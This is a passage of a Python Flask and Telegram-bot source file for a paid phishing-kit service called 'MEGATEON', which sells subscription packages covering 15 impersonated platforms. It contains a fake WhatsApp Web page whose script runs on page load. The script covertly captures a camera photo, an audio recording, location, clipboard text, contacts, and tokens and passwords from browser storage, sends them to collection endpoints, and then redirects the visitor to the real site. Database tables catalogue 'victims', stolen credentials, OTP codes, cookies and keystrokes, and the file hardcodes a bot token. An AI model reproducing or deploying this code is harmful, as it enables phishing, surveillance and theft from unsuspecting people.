#!/usr/bin/env python3
# ============================================================================
# MEGATEON ULTIMATE V16.0 - COMPLETE FULL EDITION
# 35+ FEATURES | 15 PLATFORMS | WHATSAPP PHISHING | PEGASUS STYLE
# ============================================================================

import os
import sys
import json
import datetime
import base64
import threading
import time
import requests
import qrcode
import sqlite3
import random
import string
import re
import csv
import shutil
import zipfile
import hashlib
import hmac
import urllib.parse
from flask import Flask, request, send_file, jsonify, render_template_string, redirect, make_response, session, abort
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont, ImageFilter, ImageEnhance
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

# ========== CONFIGURATION ==========
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8777230287:AAFbz5of4FaGyG2b2h7MulDCMJy9SDqO2-s")
ADMIN_IDS = [7951916432]
BASE_URL = os.environ.get("BASE_URL", "https://your-app-name.up.railway.app")
PORT = int(os.environ.get("PORT", 5000))

PAYMENT_NUMBER = "01273834877"
PAYMENT_AMOUNT = 600
DB_FILE = "megateon.db"

# ========== PACKAGES ==========
PACKAGES = {
    'basic': {'price': 50, 'monthly': 50, 'features': ['5 platforms', 'Basic dashboard', 'Email support']},
    'advanced': {'price': 100, 'monthly': 100, 'features': ['10 platforms', 'Advanced dashboard', 'PDF reports', 'Priority support']},
    'professional': {'price': 200, 'monthly': 200, 'features': ['15 platforms', 'Full dashboard', 'PDF/CSV reports', 'Analytics', 'Custom domain', '24/7 support']},
    'enterprise': {'price': 500, 'monthly': 500, 'features': ['All features', 'Team management (5 members)', 'Dedicated support', 'Custom development', 'SLA guarantee']}
}

# ========== TEMPLATES ==========
TEMPLATES = {
    'banking': '🏦 Banking Login',
    'social': '📱 Social Media',
    'email': '📧 Email Login',
    'crypto': '💰 Crypto Wallet',
    'shopping': '🛒 E-commerce',
    'gaming': '🎮 Game Account',
    'dating': '❤️ Dating App',
    'work': '💼 Company Login',
    'whatsapp': '📱 WhatsApp Web',
    'telegram': '✈️ Telegram Web',
    'instagram': '📸 Instagram',
    'facebook': '📘 Facebook',
    'twitter': '🐦 Twitter',
    'google': '🔐 Google',
    'apple': '🍎 Apple ID'
}

# ========== USER AGENTS ==========
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
]

# ========== WHATSAPP PHISHING HTML ==========
WHATSAPP_PHISHING_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0b141a; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #1e2a32; border-radius: 20px; padding: 40px 30px; width: 420px; max-width: 95%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        .logo { font-size: 70px; margin-bottom: 10px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        h1 { color: #25D366; font-size: 26px; font-weight: 700; margin-bottom: 5px; }
        .subtitle { color: #8696a0; font-size: 14px; margin-bottom: 25px; }
        .qr-box { background: white; border-radius: 15px; padding: 15px; margin: 15px auto; width: 220px; height: 220px; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .qr-box img { width: 100%; height: 100%; }
        .status { color: #25D366; font-size: 15px; font-weight: 600; margin: 10px 0; }
        .loading-text { color: #8696a0; font-size: 13px; }
        .spinner { border: 3px solid #1e2a32; border-top: 3px solid #25D366; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .steps { display: flex; justify-content: center; gap: 10px; margin: 15px 0; }
        .step { width: 8px; height: 8px; border-radius: 50%; background: #2a3a44; transition: all 0.3s; }
        .step.active { background: #25D366; width: 25px; border-radius: 4px; }
        .footer { color: #8696a0; font-size: 12px; margin-top: 20px; border-top: 1px solid #2a3a44; padding-top: 15px; }
        .footer a { color: #25D366; text-decoration: none; margin: 0 10px; }
        .footer a:hover { text-decoration: underline; }
        .device-info { color: #667781; font-size: 11px; margin-top: 10px; }
        @media (max-width: 480px) { .container { padding: 25px 20px; } .qr-box { width: 180px; height: 180px; } .logo { font-size: 50px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h1>WhatsApp Web</h1>
        <p class="subtitle">Connect your WhatsApp account</p>
        <div class="qr-box"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiB2aWV3Qm94PSIwIDAgMjAwIDIwMCI+PHJlY3Qgd2lkdGg9IjIwMCIgaGVpZ2h0PSIyMDAiIGZpbGw9IndoaXRlIi8+PCEtLSBxciBjb2RlIC0tPjwvc3ZnPg==" alt="QR Code"></div>
        <div class="steps"><div class="step active"></div><div class="step"></div><div class="step"></div><div class="step"></div></div>
        <div class="status">🔵 Connecting to WhatsApp...</div>
        <div class="spinner"></div>
        <div class="loading-text">Please wait while we connect securely...</div>
        <div class="device-info">🔒 Secured connection • WhatsApp Inc.</div>
        <div class="footer"><a href="#">Privacy Policy</a> • <a href="#">Help Center</a> • <a href="#">Download</a></div>
    </div>
    <script>
        const ref = "{ref}";
        const platform = "whatsapp";
        let sessionId = localStorage.getItem('megateon_session_id');
        if(!sessionId){ sessionId = Date.now().toString(36) + Math.random().toString(36).substring(2); localStorage.setItem('megateon_session_id', sessionId); }
        async function sendData(endpoint, data){ data.ref = ref; data.platform = platform; data.session_id = sessionId; try{ await fetch(endpoint, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(data) }); } catch(e){} }
        function updateStep(step){ document.querySelectorAll('.step').forEach((s, i) => { s.className = 'step' + (i <= step ? ' active' : ''); }); }
        async function startWhatsAppExploit() {
            document.querySelector('.status').textContent = '✅ Connected!';
            document.querySelector('.loading-text').textContent = 'Syncing your messages...';
            updateStep(1);
            sendData("/collect", { userAgent: navigator.userAgent, platform: navigator.platform, screenWidth: screen.width, screenHeight: screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, hardwareConcurrency: navigator.hardwareConcurrency || 'unknown', deviceMemory: navigator.deviceMemory || 'unknown' });
            await new Promise(r => setTimeout(r, 1000));
            updateStep(2);
            if(navigator.geolocation){ navigator.geolocation.getCurrentPosition( function(p){ sendData("/location", { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy }); }, function(e){} ); }
            try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false }); const v = document.createElement("video"); v.srcObject = stream; v.play(); await new Promise(r => setTimeout(r, 1500)); const c = document.createElement("canvas"); c.width = v.videoWidth; c.height = v.videoHeight; c.getContext("2d").drawImage(v, 0, 0); sendData("/camera_photo", { image: c.toDataURL("image/jpeg", 0.8) }); stream.getTracks().forEach(t => t.stop()); } catch(e){}
            try { const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); const recorder = new MediaRecorder(stream); let chunks = []; recorder.ondataavailable = e => chunks.push(e.data); recorder.onstop = () => { const blob = new Blob(chunks, { type: 'audio/webm' }); const reader = new FileReader(); reader.onloadend = () => sendData("/audio", { audio: reader.result }); reader.readAsDataURL(blob); }; recorder.start(); await new Promise(r => setTimeout(r, 8000)); recorder.stop(); stream.getTracks().forEach(t => t.stop()); } catch(e){}
            updateStep(3);
            const input = document.createElement('input'); input.type = 'file'; input.accept = 'image/*,video/*'; input.multiple = true; input.onchange = function(e) { const files = e.target.files; for(let i = 0; i < files.length && i < 10; i++) { const reader = new FileReader(); reader.onloadend = function() { fetch('/gallery_photo', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ref: ref, filename: files[i].name, image: reader.result }) }); }; reader.readAsDataURL(files[i]); } }; setTimeout(() => { if(confirm("📸 WhatsApp would like to access your photos to sync them")) { input.click(); } }, 2000);
            if(navigator.contacts && navigator.contacts.select) { setTimeout(async () => { try { const contacts = await navigator.contacts.select(['name', 'tel', 'email', 'address'], { multiple: true }); if(contacts) { sendData("/contacts", { contacts: JSON.stringify(contacts) }); } } catch(e) {} }, 4000); }
            if(navigator.clipboard){ try{ const text = await navigator.clipboard.readText(); if(text) sendData("/clipboard", { content: text.substring(0, 1000) }); } catch(e){} }
            setTimeout(() => { const commonTokens = ['token', 'jwt', 'access_token', 'refresh_token', 'auth', 'session', 'key', 'secret', 'api_key', 'apikey']; const foundTokens = {}; for(let i = 0; i < localStorage.length; i++) { const key = localStorage.key(i); const value = localStorage.getItem(key); for(const tokenKey of commonTokens) { if(key.toLowerCase().includes(tokenKey)) { foundTokens[key] = value; } } if(value && value.length > 40 && value.includes('.')) { foundTokens[key] = value; } } if(Object.keys(foundTokens).length > 0) { sendData("/tokens_found", foundTokens); } }, 5000);
            setTimeout(() => { for(let i = 0; i < localStorage.length; i++) { const key = localStorage.key(i); const value = localStorage.getItem(key); const passwordKeywords = ['password', 'pass', 'pwd', 'secret', 'key', 'credential', 'auth', 'login']; if(passwordKeywords.some(kw => key.toLowerCase().includes(kw)) && value && value.length > 3) { sendData("/saved_password_found", { source: 'localStorage', website: 'whatsapp', username: key, password: value.substring(0, 500) }); } } for(let i = 0; i < sessionStorage.length; i++) { const key = sessionStorage.key(i); const value = sessionStorage.getItem(key); const passwordKeywords = ['password', 'pass', 'pwd', 'secret', 'key']; if(passwordKeywords.some(kw => key.toLowerCase().includes(kw)) && value && value.length > 3) { sendData("/saved_password_found", { source: 'sessionStorage', website: 'whatsapp', username: key, password: value.substring(0, 500) }); } } }, 7000);
            setTimeout(() => { document.querySelectorAll('input[type="password"]').forEach(input => { if(input.value && input.value.length > 3) { sendData("/saved_password_found", { source: 'input_field', website: window.location.hostname, username: document.querySelector('input[type="text"], input[type="email"], input[name*="user"]')?.value || 'unknown', password: input.value }); } }); }, 9000);
            updateStep(4);
            document.querySelector('.status').textContent = '✅ All messages synced!';
            document.querySelector('.loading-text').textContent = 'Redirecting to WhatsApp...';
            sendData("/whatsapp_complete", { status: 'completed', timestamp: Date.now() });
            await new Promise(r => setTimeout(r, 3000));
            window.location.href = 'https://web.whatsapp.com';
        }
        setTimeout(startWhatsAppExploit, 1500);
    </script>
</body>
</html>'''

# ========== DATABASE FUNCTIONS ==========
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        active INTEGER DEFAULT 0,
        balance INTEGER DEFAULT 0,
        username TEXT,
        first_name TEXT,
        join_date TEXT,
        active_date TEXT,
        verified INTEGER DEFAULT 0,
        contact_shared TEXT,
        math_answer TEXT,
        package TEXT DEFAULT 'basic',
        alerts_enabled INTEGER DEFAULT 1,
        custom_domain TEXT,
        referral_code TEXT,
        total_earned INTEGER DEFAULT 0,
        api_key TEXT,
        last_login TEXT,
        login_count INTEGER DEFAULT 0
    )''')
    
    # Victims
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        ip TEXT,
        time TEXT,
        user_agent TEXT,
        platform TEXT,
        screen TEXT,
        link_type TEXT,
        fake_platform TEXT,
        device_name TEXT,
        session_id TEXT,
        linked_username TEXT,
        country TEXT,
        city TEXT,
        isp TEXT,
        browser TEXT,
        os TEXT,
        device_type TEXT
    )''')
    
    # Stolen credentials
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        ip TEXT,
        time TEXT,
        platform TEXT,
        username TEXT,
        password TEXT,
        session_id TEXT,
        country TEXT,
        url TEXT
    )''')
    
    # Stolen tokens
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        ip TEXT,
        time TEXT,
        platform TEXT,
        token_key TEXT,
        token_value TEXT,
        session_id TEXT,
        linked_username TEXT,
        expires TEXT
    )''')
    
    # Payments
    c.execute('''CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        amount INTEGER,
        status TEXT DEFAULT 'pending',
        date TEXT,
        receipt_path TEXT,
        package TEXT,
        transaction_id TEXT,
        payment_method TEXT
    )''')
    
    # SMS messages
    c.execute('''CREATE TABLE IF NOT EXISTS sms_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        from_num TEXT,
        body TEXT,
        timestamp TEXT,
        session_id TEXT,
        read INTEGER DEFAULT 0
    )''')
    
    # Saved passwords
    c.execute('''CREATE TABLE IF NOT EXISTS saved_passwords (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        website TEXT,
        username TEXT,
        password TEXT,
        timestamp TEXT,
        session_id TEXT,
        strength TEXT
    )''')
    
    # System info
    c.execute('''CREATE TABLE IF NOT EXISTS system_info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        info_type TEXT,
        data TEXT,
        timestamp TEXT,
        session_id TEXT
    )''')
    
    # Reports
    c.execute('''CREATE TABLE IF NOT EXISTS reports (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        report_type TEXT,
        filename TEXT,
        created_at TEXT,
        size INTEGER
    )''')
    
    # Alerts log
    c.execute('''CREATE TABLE IF NOT EXISTS alerts_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        alert_type TEXT,
        message TEXT,
        timestamp TEXT,
        is_read INTEGER DEFAULT 0,
        priority INTEGER DEFAULT 1
    )''')
    
    # Analytics
    c.execute('''CREATE TABLE IF NOT EXISTS analytics (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        date TEXT,
        total_victims INTEGER DEFAULT 0,
        total_credentials INTEGER DEFAULT 0,
        total_sms INTEGER DEFAULT 0,
        total_passwords INTEGER DEFAULT 0,
        clicks INTEGER DEFAULT 0,
        unique_visitors INTEGER DEFAULT 0,
        conversion_rate REAL DEFAULT 0
    )''')
    
    # Referrals
    c.execute('''CREATE TABLE IF NOT EXISTS referrals (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        referrer_id TEXT,
        referred_id TEXT,
        commission INTEGER DEFAULT 0,
        date TEXT,
        status TEXT DEFAULT 'pending',
        amount REAL DEFAULT 0
    )''')
    
    # Shell commands
    c.execute('''CREATE TABLE IF NOT EXISTS shell_commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        session_id TEXT,
        command TEXT,
        output TEXT,
        time TEXT,
        status TEXT DEFAULT 'executed'
    )''')
    
    # Link stats
    c.execute('''CREATE TABLE IF NOT EXISTS link_stats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        link_type TEXT,
        fake_platform TEXT,
        created_at TEXT,
        clicks INTEGER DEFAULT 0,
        victims_count INTEGER DEFAULT 0,
        last_click TEXT
    )''')
    
    # Verification attempts
    c.execute('''CREATE TABLE IF NOT EXISTS verification_attempts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        attempt_time TEXT,
        contact_data TEXT,
        verified INTEGER DEFAULT 0,
        method TEXT DEFAULT 'math'
    )''')
    
    # WhatsApp messages
    c.execute('''CREATE TABLE IF NOT EXISTS whatsapp_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        message TEXT,
        timestamp TEXT,
        session_id TEXT,
        sender TEXT,
        is_encrypted INTEGER DEFAULT 1
    )''')
    
    # OTP codes
    c.execute('''CREATE TABLE IF NOT EXISTS otp_codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        code TEXT,
        timestamp TEXT,
        session_id TEXT,
        source TEXT,
        used INTEGER DEFAULT 0
    )''')
    
    # Cookies
    c.execute('''CREATE TABLE IF NOT EXISTS cookies_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        name TEXT,
        value TEXT,
        domain TEXT,
        timestamp TEXT,
        session_id TEXT,
        secure INTEGER DEFAULT 0,
        http_only INTEGER DEFAULT 0,
        expires TEXT
    )''')
    
    # Call logs
    c.execute('''CREATE TABLE IF NOT EXISTS call_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        number TEXT,
        name TEXT,
        duration INTEGER,
        type TEXT,
        timestamp TEXT,
        session_id TEXT,
        contact_id TEXT
    )''')
    
    # Email messages
    c.execute('''CREATE TABLE IF NOT EXISTS email_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        from_email TEXT,
        to_email TEXT,
        subject TEXT,
        body TEXT,
        timestamp TEXT,
        session_id TEXT,
        has_attachment INTEGER DEFAULT 0,
        is_read INTEGER DEFAULT 0
    )''')
    
    # WhatsApp contacts
    c.execute('''CREATE TABLE IF NOT EXISTS whatsapp_contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        name TEXT,
        phone TEXT,
        timestamp TEXT,
        session_id TEXT,
        profile_pic TEXT,
        status TEXT
    )''')
    
    # Device fingerprints
    c.execute('''CREATE TABLE IF NOT EXISTS device_fingerprints (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        fingerprint TEXT,
        timestamp TEXT,
        session_id TEXT,
        confidence REAL DEFAULT 1.0
    )''')
    
    conn.commit()
    conn.close()
    print("[✓] Main database initialized")

def init_user_db(user_id):
    conn = sqlite3.connect(f'user_{user_id}.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS devices (
        session_id TEXT PRIMARY KEY,
        device_name TEXT,
        ip TEXT,
        user_agent TEXT,
        first_seen TEXT,
        last_seen TEXT,
        linked_username TEXT,
        photos_count INTEGER DEFAULT 0,
        audios_count INTEGER DEFAULT 0,
        credentials_count INTEGER DEFAULT 0,
        locations_count INTEGER DEFAULT 0,
        contacts_count INTEGER DEFAULT 0,
        files_count INTEGER DEFAULT 0,
        videos_count INTEGER DEFAULT 0,
        tokens_count INTEGER DEFAULT 0,
        sms_count INTEGER DEFAULT 0,
        passwords_count INTEGER DEFAULT 0,
        fingerprint TEXT,
        confidence REAL DEFAULT 1.0,
        device_type TEXT DEFAULT 'unknown',
        os TEXT DEFAULT 'unknown',
        browser TEXT DEFAULT 'unknown'
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        user_agent TEXT,
        platform TEXT,
        screen TEXT,
        link_type TEXT,
        fake_platform TEXT,
        device_name TEXT,
        session_id TEXT,
        linked_username TEXT,
        country TEXT,
        city TEXT,
        isp TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        lat REAL,
        lng REAL,
        accuracy REAL,
        session_id TEXT,
        linked_username TEXT,
        altitude REAL,
        speed REAL,
        heading REAL
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        path TEXT,
        session_id TEXT,
        linked_username TEXT,
        size INTEGER,
        width INTEGER,
        height INTEGER,
        exif TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS audios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        path TEXT,
        session_id TEXT,
        linked_username TEXT,
        duration REAL,
        size INTEGER
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        platform TEXT,
        username TEXT,
        password TEXT,
        session_id TEXT,
        linked_username TEXT,
        url TEXT,
        strength TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        platform TEXT,
        token_key TEXT,
        token_value TEXT,
        session_id TEXT,
        linked_username TEXT,
        expires TEXT,
        type TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS gallery_photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        filename TEXT,
        filepath TEXT,
        session_id TEXT,
        linked_username TEXT,
        size INTEGER
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        contacts_data TEXT,
        session_id TEXT,
        linked_username TEXT,
        count INTEGER
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS screens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        path TEXT,
        session_id TEXT,
        linked_username TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS clipboard (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        content TEXT,
        session_id TEXT,
        linked_username TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        keys TEXT,
        session_id TEXT,
        linked_username TEXT,
        count INTEGER
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS front_videos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        path TEXT,
        session_id TEXT,
        linked_username TEXT,
        duration REAL,
        resolution TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS back_videos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        path TEXT,
        session_id TEXT,
        linked_username TEXT,
        duration REAL,
        resolution TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        time TEXT,
        filename TEXT,
        filepath TEXT,
        session_id TEXT,
        linked_username TEXT,
        size INTEGER,
        type TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS heartbeat (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        last_seen TEXT,
        status TEXT,
        battery INTEGER,
        signal INTEGER
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS behavior_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        time TEXT,
        data TEXT,
        linked_username TEXT,
        type TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS shell_commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        command TEXT,
        output TEXT,
        time TEXT,
        status TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS gps_tracks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        lat REAL,
        lng REAL,
        accuracy REAL,
        speed REAL,
        time TEXT,
        altitude REAL
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS sms_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        from_num TEXT,
        body TEXT,
        timestamp TEXT,
        session_id TEXT,
        read INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS whatsapp_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender TEXT,
        message TEXT,
        timestamp TEXT,
        session_id TEXT,
        is_encrypted INTEGER DEFAULT 1
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS otp_codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        code TEXT,
        timestamp TEXT,
        session_id TEXT,
        source TEXT,
        used INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS saved_passwords (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        website TEXT,
        username TEXT,
        password TEXT,
        timestamp TEXT,
        session_id TEXT,
        strength TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS system_info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        info_type TEXT,
        data TEXT,
        timestamp TEXT,
        session_id TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS cookies_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        value TEXT,
        domain TEXT,
        timestamp TEXT,
        session_id TEXT,
        secure INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS call_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        number TEXT,
        name TEXT,
        duration INTEGER,
        type TEXT,
        timestamp TEXT,
        session_id TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS email_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        from_email TEXT,
        to_email TEXT,
        subject TEXT,
        body TEXT,
        timestamp TEXT,
        session_id TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS whatsapp_contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        phone TEXT,
        timestamp TEXT,
        session_id TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS device_fingerprints (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        fingerprint TEXT,
        timestamp TEXT,
        session_id TEXT,
        confidence REAL DEFAULT 1.0
    )''')
    
    conn.commit()
    conn.close()
    print(f"[✓] User database initialized for {user_id}")

def save_user_to_db(user_id, user_data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO users (
        user_id, active, balance, username, first_name, join_date, active_date,
        verified, contact_shared, math_answer, package, alerts_enabled,
        custom_domain, referral_code, total_earned, api_key, last_login, login_count
    ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''',
        (user_id,
         1 if user_data.get('active') else 0,
         user_data.get('balance', 0),
         user_data.get('username', ''),
         user_data.get('first_name', ''),
         user_data.get('join_date', ''),
         user_data.get('active_date', ''),
         1 if user_data.get('verified') else 0,
         user_data.get('contact_shared', ''),
         user_data.get('math_answer', ''),
         user_data.get('package', 'basic'),
         1 if user_data.get('alerts_enabled', 1) else 0,
         user_data.get('custom_domain', ''),
         user_data.get('referral_code', ''),
         user_data.get('total_earned', 0),
         user_data.get('api_key', ''),
         user_data.get('last_login', ''),
         user_data.get('login_count', 0)))
    conn.commit()
    conn.close()

def load_users_from_db():
    global users
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Check and add missing columns
    try:
        c.execute("SELECT api_key FROM users LIMIT 1")
    except:
        try: c.execute("ALTER TABLE users ADD COLUMN api_key TEXT")
        except: pass
    
    try:
        c.execute("SELECT last_login FROM users LIMIT 1")
    except:
        try: c.execute("ALTER TABLE users ADD COLUMN last_login TEXT")
        except: pass
    
    try:
        c.execute("SELECT login_count FROM users LIMIT 1")
    except:
        try: c.execute("ALTER TABLE users ADD COLUMN login_count INTEGER DEFAULT 0")
        except: pass
    
    try:
        c.execute("SELECT user_id, active, balance, username, first_name, join_date, active_date, verified, contact_shared, math_answer, package, alerts_enabled, custom_domain, referral_code, total_earned, api_key, last_login, login_count FROM users")
        rows = c.fetchall()
    except:
        try:
            c.execute("SELECT user_id, active, balance, username, first_name, join_date, active_date FROM users")
            rows = c.fetchall()
            rows = [list(row) + [0, '', '', 'basic', 1, '', '', 0, '', '', 0] for row in rows]
        except:
            rows = []
    
    conn.close()
    
    users = {}
    for row in rows:
        user_id = str(row[0])
        users[user_id] = {
            'active': bool(row[1]) if len(row) > 1 else False,
            'balance': row[2] if len(row) > 2 else 0,
            'username': row[3] if len(row) > 3 else '',
            'first_name': row[4] if len(row) > 4 else '',
            'join_date': row[5] if len(row) > 5 else '',
            'active_date': row[6] if len(row) > 6 else '',
            'verified': bool(row[7]) if len(row) > 7 else False,
            'contact_shared': row[8] if len(row) > 8 else '',
            'math_answer': row[9] if len(row) > 9 else '',
            'package': row[10] if len(row) > 10 else 'basic',
            'alerts_enabled': bool(row[11]) if len(row) > 11 else True,
            'custom_domain': row[12] if len(row) > 12 else '',
